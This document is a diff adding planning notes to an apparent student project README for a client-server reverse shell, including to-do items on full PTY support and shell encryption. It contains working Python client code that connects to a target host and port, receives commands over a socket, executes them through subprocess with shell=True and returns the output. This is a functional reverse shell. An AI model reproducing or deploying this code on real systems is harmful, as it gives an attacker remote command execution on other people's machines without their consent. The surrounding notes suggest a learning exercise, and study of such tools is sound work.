@@ -14,6 +14,69 @@ The client payload listens for the server commands and executes them in string f
 
 
 TLDR: Sever & Client maintain a connection, server sends requests, client executes requests with hardcoded functionality within its local payload.
+================================
+What else do we need to do & what is actually needed:
+
+- full pty capabilites (copp)
+	client side:
+	commands, usage functionality, error handling, (google everything needed for a good pty shell), (figure out the inner workings of a fully functional PTY shell)
+	- Our own Subprocess for executing commands
+
+- shell encryption (future ting, google a bit tho)
+- testing
+
+
+
+
+=================================
+Playzone:
+
+
+Aqeeb notes for the 2hr:
+we need to scope our path ahead properly in terms of what’s actually needed.
+	<done>
+take a step back and figure it out first
+	<done>
+We talk about it, draw it, pseudocode it.
+	<need to pseudocode>
+Can we understand what it is we’re trying to do?
+	<we are trying to create a beautiful custom shell which successfuly speaks from client-server) 
+We really need to understand the inner workings of an actual shell and how to incorporate a fully functional PTY shell.
+	<working on that>
+
+Shell development:
+	maybe use bash shell and personaly improve its functionality. 
+	<possibly>
+	we have errors in our shell which need to be fixed to make it fully pty compatible 
+	<Do some testing>
+
+-------------------------------
+Subprocess stuffs:
+import socket
+import os
+import subprocess
+#1
+target_host = ""
+target_port = 99
+#2
+client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+client.connect((target_host,target_port))
+#3
+while True:
+    data = client.recv(1024)
+    if data[:2].decode("utf-8") == 'cd':
+        os.chdir(data[3:].decode("utf-8"))
+    if len(data) > 0:
+        cmd = subprocess.Popen(data[:], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE )
+        output_bytes = cmd.stdout.read()
+        output_str = str(output_bytes, "utf-8")
+        client.send(str.encode(output_str + str(os.getcwd()) + '$'))
+        #print(output_str)
+client.close()
+
+
+
+----------------------------------
 -------------------------------------------------------------------------------------------
 New:
 Create a reliable network program to send data between a network sender and listener (reverse shell)
